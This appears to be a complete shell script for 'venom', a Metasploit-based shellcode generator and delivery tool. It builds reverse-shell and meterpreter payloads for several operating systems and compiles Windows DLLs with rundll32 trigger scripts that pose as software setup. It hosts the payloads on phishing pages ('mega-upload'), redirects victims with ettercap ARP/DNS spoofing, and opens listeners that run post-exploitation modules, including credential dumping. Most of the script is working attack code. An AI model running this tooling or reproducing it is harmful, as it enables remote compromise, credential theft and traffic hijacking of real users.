#!/bin/sh
# --------------------------------------------------------------
# venom - metasploit Shellcode generator/compiler/listenner
# Author: pedr0 Ubuntu [r00t-3xp10it] version: 1.0.11
# Suspicious-Shell-Activity (SSA) RedTeam develop @2016
# codename: malicious_server [ GPL licensed ]
# --------------------------------------------------------------
# [DEPENDENCIES]
# "venom.sh will download/install all dependencies as they are needed"
# Zenity | Metasploit | GCC (unix) |  Pyinstaller (python-to-exe module)
# mingw32 (compile .EXE executables) | pyherion.py (crypter)
# PEScrambler.exe (PE obfuscator/scrambler) | apache2 webserver
# vbs-obfuscator | encrypt_PolarSSL | ettercap (dns_spoof) | WINE
# --------------------------------------------------------------
# Resize terminal windows size befor running the tool (gnome terminal)
# Special thanks to h4x0r Milton@Barra for this little piece of heaven! :D
resize -s 33 86 > /dev/null
# inicio




# ---------------------
# check if user is root
# ---------------------
if [ $(id -u) != "0" ]; then
echo "[☠ ] we need to be root to run this script..."
echo "[☠ ] execute [ sudo ./venom.sh ] on terminal"
exit
else
echo "root user" > /dev/null 2>&1
fi





# ----------------------
# variable declarations
# ----------------------
OS=`uname` # grab OS
H0m3=`echo ~` # grab home path
ver="1.0.11" # script version display
C0d3="malicious_server" # version codename display
user=`who | cut -d' ' -f1 | sort | uniq` # grab username
DiStR0=`awk '{print $1}' /etc/issue` # grab distribution -  Ubuntu or Kali
IPATH=`pwd` # grab venom.sh install path (home/username/shell)
# ------------------------------------------------------------------------
# funtions [templates] to be injected with shellcode
# ------------------------------------------------------------------------
Ch4Rs="$IPATH/output/chars.raw" # shellcode raw output path
InJEc="$IPATH/templates/exec.c" # exec script path
InJEc2="$IPATH/templates/exec.py" # exec script path
InJEc3="$IPATH/templates/exec_bin.c" # exec script path
InJEc4="$IPATH/templates/exec.rb" # exec script path
InJEc5="$IPATH/templates/exec_dll.c" # exec script path
InJEc6="$IPATH/templates/hta_attack/exec.hta" # exec script path
InJEc7="$IPATH/templates/hta_attack/index.html" # hta index path
InJEc8="$IPATH/templates/InvokePS1.bat" # invoke-shellcode script path
InJEc9="$IPATH/templates/exec0.py" # exec script path
InJEc10="$IPATH/templates/InvokeMeter.bat" # exec script path
InJEc11="$IPATH/templates/exec.php" # php script path
# phishing webpages to trigger RCE or downloads
InJEc12="$IPATH/templates/phishing/mega.html" # fake webpage script path
InJEc13="$IPATH/templates/phishing/driveBy.html" # fake webpage script path
InJEc14="$IPATH/templates/hta_attack/index.html" # fake webpage script path




# ------------------------------------------------------------------------
# CHOSE TO USE DEFAULT SETTINGS OR 'VENOM.CONF' SETTINGS
# ------------------------------------------------------------------------
if [ -e aux/venom.conf ]; then
conf="venom"
ApAcHe=`cat $IPATH/aux/venom.conf | egrep -m 1 "APACHE_WEBROOT" | cut -d '=' -f2` > /dev/null 2>&1
DrIvC=`cat $IPATH/aux/venom.conf | egrep -m 1 "WINE_DRIVEC" | cut -d '=' -f2` > /dev/null 2>&1
MiG=`cat $IPATH/aux/fast_migrate.rc | grep "migrate" | awk {'print $4'}` > /dev/null 2>&1

else

  if [ "$DiStR0" = "Ubuntu" ]; then
    ApAcHe="/var/www"
    elif [ "$DiStR0" = "Kali" ]; then
    ApAcHe="/var/www/html"
    elif [ "$DiStR0" = "BackBox" ]; then
    ApAcHe="/var/www/html"
  else
    ApAcHe="/var/www/html"
  fi

# default settings
conf="default"
DrIvC="$H0m3/.wine/drive_c" # wine drive_c path
fi





# --------------------------------------------
# check for the existance of venom domain name
# --------------------------------------------
if [ -d aux/public_html ]; then
D0M4IN="yes"
else
D0M4IN="no"
fi





# ---------------------------------------------
# grab Operative System distro to store IP addr
# output = Ubuntu OR Kali OR Parrot OR BackBox
# ---------------------------------------------
InT3R=`netstat -r | grep "default" | awk {'print $8'}` # grab interface in use
case $DiStR0 in
    Kali) IP=`ifconfig $InT3R | egrep -w "inet" | cut -d ':' -f2 | cut -d 'B' -f1`;;
    Debian) IP=`ifconfig $InT3R | egrep -w "inet" | awk '{print $2}'`;;
    Ubuntu) IP=`ifconfig $InT3R | egrep -w "inet" | cut -d ':' -f2 | cut -d 'B' -f1`;;
    Parrot) IP=`ifconfig $InT3R | egrep -w "inet" | cut -d ':' -f2 | cut -d 'B' -f1`;;
    BackBox) IP=`ifconfig $InT3R | egrep -w "inet" | cut -d ':' -f2 | cut -d 'B' -f1`;;
    elementary) IP=`ifconfig $InT3R | egrep -w "inet" | cut -d ':' -f2 | cut -d 'B' -f1`;;
    *) IP=`zenity --title="☠ Input your IP addr ☠" --text "example: 192.168.1.68" --entry --width 300`;;
  esac
clear





# ------------------------------------
# end of script internal settings and
# display credits befor running module
# ------------------------------------
cat << !

   +-+-+-+-+-+-+-+-+-+  +-+-+-+-+-+-+-+-+-+
   |S|h|e|l|l|c|0|d|e|  |G|e|n|e|r|a|t|0|r|
   +-+-+-+-+-+-+-+-+-+  +-+-+-+-+-+-+-+-+-+
                           $C0d3

!
echo "---"
echo "-- The author does not hold any responsibility for the bad use"
echo "-- of this tool, remember that attacking targets without prior"
echo "-- consent is illegal and punished by law."
echo "--"
echo "-- The main goal of this tool its not to build 'FUD' payloads!..."
echo "-- But to give to its users the first glance of how shellcode is"
echo "-- build, embedded into one template (any language), obfuscated"
echo "-- (e.g pyherion.py) and compiled into one executable file."
echo "-- 'reproducing technics found in Veil,Unicorn,powersploit'" 
echo "--"
echo "-- Author:r00t-3xp10it | Suspicious Shell Activity (RedTeam)"
echo "-- VERSION:$ver USER:$user INTERFACE:$InT3R DISTRO:$DiStR0"
echo "---"
sleep 3
echo "[☠ ] Press [ENTER] to continue..."
read op
clear





# -----------------------------------------
# check dependencies (msfconsole + apache2)
# -----------------------------------------
imp=`which msfconsole`
if [ "$?" -eq "0" ]; then
echo "msfconsole found" > /dev/null 2>&1
else
echo ""
echo "[☠ ] msfconsole -> not found!"
echo "[☠ ] This script requires msfconsole to work!"
sleep 2
exit
fi


apc=`which apache2`
if [ "$?" -eq "0" ]; then
echo "apache2 found" > /dev/null 2>&1
else
echo ""
echo "[☠ ] apache2 -> not found!"
echo "[☠ ] This script requires apache2 to work!"
sleep 2
echo ""
echo "[☠ ] Please run: cd aux && sudo ./setup.sh"
echo "[☠ ] to install all missing dependencies..."
exit
fi





# ----------------------------------
# bash trap ctrl-c and call ctrl_c()
# ----------------------------------
trap ctrl_c INT
ctrl_c() {
echo "[☠ ] CTRL+C PRESSED -> ABORTING TASKS!"
sleep 1
echo "[☠ ] Cleanning temp generated files..."
# just in case :D !!!
# revert [templates] backup files to default stages
mv $IPATH/templates/exec[bak].c $InJEc > /dev/null 2>&1
mv $IPATH/templates/exec[bak].py $InJEc2 > /dev/null 2>&1
mv $IPATH/templates/exec_bin[bak].c $InJEc3 > /dev/null 2>&1
mv $IPATH/templates/exec[bak].rb $InJEc4 > /dev/null 2>&1
mv $IPATH/templates/exec_dll[bak].c $InJEc5 > /dev/null 2>&1
mv $IPATH/templates/hta_attack/exec[bak].hta $InJEc6 > /dev/null 2>&1
mv $IPATH/templates/hta_attack/index[bak].html $InJEc7 > /dev/null 2>&1
mv $IPATH/templates/InvokePS1[bak].bat $InJEc8 > /dev/null 2>&1
mv $IPATH/templates/exec0[bak].py $InJEc9 > /dev/null 2>&1
mv $IPATH/templates/exec[bak].php $InJEc11 > /dev/null 2>&1
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
mv $IPATH/templates/phishing/driveBy[bak].html $InJEc13 > /dev/null 2>&1
mv $IPATH/templates/web_delivery[bak].bat $IPATH/templates/web_delivery.bat > /dev/null 2>&1
# delete temp generated files
rm $IPATH/templates/trigger.raw > /dev/null 2>&1
rm $IPATH/templates/obfuscated.raw > /dev/null 2>&1
rm $IPATH/templates/copy.c > /dev/null 2>&1
rm $IPATH/templates/copy2.c > /dev/null 2>&1
rm $IPATH/output/chars.raw > /dev/null 2>&1
rm $IPATH/output/sedding.raw > /dev/null 2>&1
rm $IPATH/output/payload.raw > /dev/null 2>&1
rm $IPATH/bin/*.ps1 > /dev/null 2>&1
rm $IPATH/bin/*.vbs > /dev/null 2>&1
rm -r $H0m3/.psploit > /dev/null 2>&1
rm $IPATH/bin/sedding.raw > /dev/null 2>&1
rm $IPATH/obfuscate/final.vbs > /dev/null 2>&1
# delete temp files from apache webroot
rm $ApAcHe/$N4m > /dev/null 2>&1
rm $ApAcHe/trigger.bat > /dev/null 2>&1
rm $ApAcHe/trigger.sh > /dev/null 2>&1
# delete pyinstaller temp files
rm $IPATH/*.spec > /dev/null 2>&1
rm -r $IPATH/dist > /dev/null 2>&1
rm -r $IPATH/build > /dev/null 2>&1
# exit venom.sh
echo "[☠ ] Exit Shellcode Generator..."
echo "[_Codename:malicious_server]"
echo "☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆"
sleep 1
if [ "$DiStR0" = "Kali" ]; then
/etc/init.d/postgresql stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop postgresql service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
/etc/init.d/metasploit stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop metasploit service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
/etc/init.d/apache2 stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop apache2 service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
else
/etc/init.d/metasploit stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop metasploit service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
/etc/init.d/apache2 stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop apache2 service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
fi
cd $IPATH
cd ..
sudo chown -hR $user shell > /dev/null 2>&1
exit
}





# --------------------------------------------
# start metasploit/postgresql/apache2 services
# --------------------------------------------
if [ "$DiStR0" = "Kali" ]; then
/etc/init.d/postgresql start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting postgresql service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
/etc/init.d/metasploit start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting metasploit service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
/etc/init.d/apache2 start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting apache2 webserver" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
else
/etc/init.d/metasploit start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting metasploit service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
/etc/init.d/apache2 start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting apache2 webserver" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
fi
clear

# -----------END OF SCRIPT SETTINGS------------>








# ---------------------------------------------
# build shellcode in C format
# targets: Apple | BSD | LINUX | SOLARIS
# ---------------------------------------------
sh_shellcode1 () {
# get user input to build shellcode
echo "[☠ ] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 330) > /dev/null 2>&1
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 330) > /dev/null 2>&1


# input payload choise
paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "linux/ppc/shell_reverse_tcp" FALSE "linux/x86/shell_reverse_tcp" FALSE "linux/x86/meterpreter/reverse_tcp" FALSE "osx/armle/shell_reverse_tcp" FALSE "osx/ppc/shell_reverse_tcp" FALSE "bsd/x86/shell/reverse_tcp" FALSE "solaris/x86/shell_reverse_tcp" --width 350 --height 300) > /dev/null 2>&1

echo "[☠ ] Building shellcode -> C language..."
echo "" > $IPATH/output/chars.raw
# display final settings to user
cat << !

 shellcode settings
+------------------
| LPORT   : $lport
| LHOST   : $lhost
|_PAYLOAD : $paylo

!

# use metasploit to build shellcode
xterm -T "☠ SHELLCODE GENERATOR ☠" -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f c > $IPATH/output/chars.raw"

echo ""
# display generated shelcode
cat $IPATH/output/chars.raw
echo "" && echo ""
sleep 2

   # check if all dependencies needed are installed
   # chars.raw | exec.c | gcc compiler
   # check if template exists
   if [ -e $InJEc ]; then
      echo "[☠ ] exec.c -> found!"
      sleep 2
   else
      echo "[☠ ] exec.c -> not found!"
      exit
   fi

   # check if chars.raw as generated
   if [ -e $Ch4Rs ]; then
      echo "[☠ ] chars.raw -> found!"
      sleep 2
 
   else

      echo "[☠ ] chars.raw -> not found!"
      exit
      fi

   # check if gcc exists
   c0m=`which gcc`> /dev/null 2>&1
   if [ "$?" -eq "0" ]; then
      echo "[☠ ] gcc compiler -> found!"
      sleep 2
 
   else

      echo "[☠ ] gcc compiler -> not found!"
      echo "[☠ ] Download compiler -> apt-get install gcc"
      echo ""
      sudo apt-get install gcc
      echo ""
      fi


# EDITING/BACKUP FILES NEEDED
N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: shellcode" --width 300) > /dev/null 2>&1
echo "[☠ ] editing/backup files..."
cp $InJEc $IPATH/templates/exec[bak].c

   # edit exec.c using leafpad or gedit editor
   if [ "$DiStR0" = "Kali" ]; then
      leafpad $InJEc > /dev/null 2>&1
   else
      gedit $InJEc > /dev/null 2>&1
   fi

cd $IPATH/templates
# COMPILING SHELLCODE USING GCC
echo "[☠ ] Compiling using gcc..."
gcc -fno-stack-protector -z execstack exec.c -o $N4m
mv $N4m $IPATH/output/$N4m

# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m\n\nExecute: sudo ./$N4m\n\nchose how to deliver: $N4m" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 350 --height 260) > /dev/null 2>&1

   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo "[☠ ] Start a multi-handler..."
      echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯ ] Please dont test samples on virus total..."
xterm -T "☠ PAYLOAD MULTI-HANDLER ☠" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
      sleep 2


   else


      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m|g" mega.html > copy.html
      mv copy.html $ApAcHe/index.html > /dev/null 2>&1
      # copy from output
      cd $IPATH/output
      cp $N4m $ApAcHe/$N4m > /dev/null 2>&1
      echo "[☠ ] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "yes" ]; then
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠ ] Start a multi-handler..."
        echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯ ] Please dont test samples on virus total..."
        xterm -T "☠ PAYLOAD MULTI-HANDLER ☠" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'" & xterm -T "☠ DNS_SPOOF [redirecting traffic] ☠" -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"

        else

        echo "- ATTACK VECTOR: http://$lhost"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠ ] Start a multi-handler..."
        echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯ ] Please dont test samples on virus total..."
        xterm -T "☠ PAYLOAD MULTI-HANDLER ☠" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"

        fi
   fi


# CLEANING EVERYTHING UP
echo "[☠ ] Cleanning temp generated files..."
mv $IPATH/templates/exec[bak].c $InJEc
rm $IPATH/output/chars.raw > /dev/null 2>&1
rm $ApAcHe/$N4m > /dev/null 2>&1
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
sleep 2
clear
cd $IPATH/
}





# -----------------------------------------------------------------
# build shellcode in DLL format (windows-platforms)
# mingw32 obfustated using astr0babbys method and build trigger.bat
# to use in winrar/sfx 'make payload executable by pressing on it'
# -----------------------------------------------------------------
sh_shellcode2 () {
# get user input to build shellcode
echo "[☠ ] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 330) > /dev/null 2>&1
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 330) > /dev/null 2>&1

# input payload choise
paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" --width 350 --height 265) > /dev/null 2>&1

echo "[☠ ] Building shellcode -> C language..."
echo "" > $IPATH/output/chars.raw
# display final settings to user
cat << !

 shellcode settings
+------------------
| LPORT   : $lport
| LHOST   : $lhost
|_PAYLOAD : $paylo

!

# use metasploit to build shellcode
xterm -T "☠ SHELLCODE GENERATOR ☠" -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f c > $IPATH/output/chars.raw"

echo ""
# display generated shelcode
cat $IPATH/output/chars.raw
echo "" && echo ""
sleep 2

   # check if all dependencies needed are installed
   # check if template exists
   if [ -e $InJEc5 ]; then
      echo "[☠ ] exec_dll.c -> found!"
      sleep 2
   else
      echo "[☠ ] exec_dll.c -> not found!"
      exit
   fi

   # check if chars.raw as generated
   if [ -e $Ch4Rs ]; then
      echo "[☠ ] chars.raw -> found!"
      sleep 2
 
   else

      echo "[☠ ] chars.raw -> not found!"
      exit
      fi

   # check if mingw32 exists
   c0m=`which i586-mingw32msvc-gcc`> /dev/null 2>&1
   if [ "$?" -eq "0" ]; then
      echo "[☠ ] mingw32 compiler -> found!"
      sleep 2
 
   else

      echo "[☠ ] mingw32 compiler -> not found!"
      echo "[☠ ] Download compiler -> apt-get install mingw32"
      echo ""
      sudo apt-get install mingw32
      echo ""
      fi


# EDITING/BACKUP FILES NEEDED
N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: shellcode.dll" --width 300) > /dev/null 2>&1
echo "[☠ ] editing/backup files..."
cp $InJEc5 $IPATH/templates/exec_dll[bak].c
cp $InJEc7 $IPATH/templates/hta_attack/index[bak].html

cd $IPATH/templates
# use SED to replace IpADr3 and P0rT
echo "[☠ ] Injecting shellcode -> $N4m!"
sleep 2
sed "s|IpADr3|$lhost|g" exec_dll.c > copy.c
sed "s|P0rT|$lport|g" copy.c > copy2.c
mv copy2.c exec_dll.c
rm copy.c

# build winrar-SFX trigger.bat script
echo "[☠ ] Building winrar/SFX -> trigger.bat..."
sleep 2
echo ":: SFX auxiliary | Author: r00t-3xp10it" > $IPATH/output/trigger.bat
echo ":: this script will run payload using rundll32" >> $IPATH/output/trigger.bat
echo ":: ---" >> $IPATH/output/trigger.bat
echo "@echo off" >> $IPATH/output/trigger.bat
echo "echo [*] Please wait, preparing software ..." >> $IPATH/output/trigger.bat
echo "rundll32.exe $N4m,main" >> $IPATH/output/trigger.bat
echo "exit" >> $IPATH/output/trigger.bat
sleep 2

# COMPILING SHELLCODE USING mingw32
echo "[☠ ] Compiling/obfuscating using mingw32..."
sleep 2
# special thanks to astr0baby for mingw32 -mwindows flag :D
i586-mingw32msvc-gcc exec_dll.c -o $N4m -lws2_32 -shared -mwindows
strip $N4m
mv $N4m $IPATH/output/$N4m



# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m\n$IPATH/output/trigger.bat\n\nExecute on cmd: rundll32.exe $N4m,main\n\nchose how to deliver: $N4m" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 350 --height 260) > /dev/null 2>&1

   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo "[☠ ] Start a multi-handler..."
      echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯ ] Please dont test samples on virus total..."
xterm -T "☠ PAYLOAD MULTI-HANDLER ☠" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
      sleep 2


   else


      # user settings
      N4m=$(zenity --title="☠ SFX Infection ☠" --text "WARNING BEFOR CLOSING THIS BOX:\n\nTo use SFX attack vector: $N4m needs to be\ncompressed together with trigger.bat into one SFX\n\n1º compress the two files into one SFX\n2º store SFX into shell/output folder\n3º write the name of the SFX file\n4º press OK to continue...\n\nExample:output.exe" --entry --width 360) > /dev/null 2>&1
      P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" --width 350 --height 240) > /dev/null 2>&1
      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m|g" mega.html > copy.html
      cp copy.html $ApAcHe/index.html > /dev/null 2>&1
      cd $IPATH/output
      cp $N4m $ApAcHe/$N4m > /dev/null 2>&1
      echo "[☠ ] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "yes" ]; then
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠ ] Start a multi-handler..."
        echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯ ] Please dont test samples on virus total..."
        xterm -T "☠ PAYLOAD MULTI-HANDLER ☠" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T "☠ DNS_SPOOF [redirecting traffic] ☠" -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"

        else

        echo "- ATTACK VECTOR: http://$lhost"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠ ] Start a multi-handler..."
        echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯ ] Please dont test samples on virus total..."
        xterm -T "☠ PAYLOAD MULTI-HANDLER ☠" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"

        fi
   fi


# CLEANING EVERYTHING UP
echo "[☠ ] Cleanning temp generated files..."
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
mv $IPATH/templates/exec_dll[bak].c $InJEc5
rm $IPATH/output/chars.raw > /dev/null 2>&1
rm $IPATH/templates/copy.c > /dev/null 2>&1
rm $IPATH/templates/copy2.c > /dev/null 2>&1
rm $ApAcHe/$N4m > /dev/null 2>&1
rm $ApAcHe/trigger.bat > /dev/null 2>&1
sleep 2
clear
cd $IPATH/
}





# -------------------------------------------------
# build shellcode in DLL format (windows-platforms)
# and build trigger.bat to use in winrar/sfx
# 'make payload executable by pressing on it'
# -------------------------------------------------
sh_shellcode3 () {
# get user input to build shellcode
echo "[☠ ] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 330) > /dev/null 2>&1
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 330) > /dev/null 2>&1
N4m=$(zenity --title="☠ DLL NAME ☠" --text "example: shellcode.dll" --entry --width 330) > /dev/null 2>&1

# input payload choise
paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" --width 350 --height 265) > /dev/null 2>&1

echo "[☠ ] Building shellcode -> dll language..."
# display final settings to user
cat << !

 shellcode settings
+------------------
| LPORT   : $lport
| LHOST   : $lhost
|_PAYLOAD : $paylo

!

# use metasploit to build shellcode
xterm -T "☠ SHELLCODE GENERATOR ☠" -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f dll > $IPATH/output/$N4m"
echo ""
echo "[☠ ] editing/backup files..."
cp $InJEc7 $IPATH/templates/hta_attack/index[bak].html


echo "[☠ ] Injecting shellcode -> $N4m!"
sleep 2
# build winrar-SFX trigger.bat script
echo "[☠ ] Building winrar/SFX -> trigger.bat..."
sleep 2
echo ":: SFX auxiliary | Author: r00t-3xp10it" > $IPATH/output/trigger.bat
echo ":: this script will run payload using rundll32" >> $IPATH/output/trigger.bat
echo ":: ---" >> $IPATH/output/trigger.bat
echo "@echo off" >> $IPATH/output/trigger.bat
echo "echo [*] Please wait, preparing software ..." >> $IPATH/output/trigger.bat
echo "rundll32.exe $N4m,main" >> $IPATH/output/trigger.bat
echo "exit" >> $IPATH/output/trigger.bat
sleep 2


# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m\n$IPATH/output/trigger.bat\n\nExecute on cmd: rundll32.exe $N4m,main\n\nchose how to deliver: $N4m" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 350 --height 260) > /dev/null 2>&1

   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo "[☠ ] Start a multi-handler..."
      echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯ ] Please dont test samples on virus total..."
xterm -T "☠ PAYLOAD MULTI-HANDLER ☠" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
      sleep 2


   else


      N4m=$(zenity --title="☠ SFX Infection ☠" --text "WARNING BEFOR CLOSING THIS BOX:\n\nTo use SFX attack vector: $N4m needs to be\ncompressed together with trigger.bat into one SFX\n\n1º compress the two files into one SFX\n2º store SFX into shell/output folder\n3º write the name of the SFX file\n4º press OK to continue...\n\nExample:output.exe" --entry --width 360) > /dev/null 2>&1
      P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" --width 350 --height 240) > /dev/null 2>&1
      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m|g" mega.html > copy.html
      cp copy.html $ApAcHe/index.html > /dev/null 2>&1
      cd $IPATH/output
      cp $N4m $ApAcHe/$N4m > /dev/null 2>&1
      echo "[☠ ] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "yes" ]; then
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠ ] Start a multi-handler..."
        echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯ ] Please dont test samples on virus total..."
        xterm -T "☠ PAYLOAD MULTI-HANDLER ☠" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T "☠ DNS_SPOOF [redirecting traffic] ☠" -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"

        else

        echo "- ATTACK VECTOR: http://$lhost"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠ ] Start a multi-handler..."
        echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯ ] Please dont test samples on virus total..."
        xterm -T "☠ PAYLOAD MULTI-HANDLER ☠" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"

        fi
   fi

sleep 2
# CLEANING EVERYTHING UP
echo "[☠ ] Cleanning temp generated files..."
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
